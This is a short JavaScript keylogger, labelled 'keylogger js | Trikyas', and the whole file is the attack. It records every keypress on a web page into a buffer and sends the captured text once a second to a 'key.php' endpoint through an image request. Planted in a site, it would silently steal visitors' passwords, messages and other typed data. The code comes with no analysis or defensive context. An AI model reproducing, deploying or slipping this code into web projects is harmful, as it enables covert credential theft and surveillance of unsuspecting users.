// keylogger js | Trikyas

var keys = "";
document.onkeypress = function(e){
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
//
window.setInterval(function(){
  new Image().src = 'key.php?c='+keys;
  keys = "";
},1000);
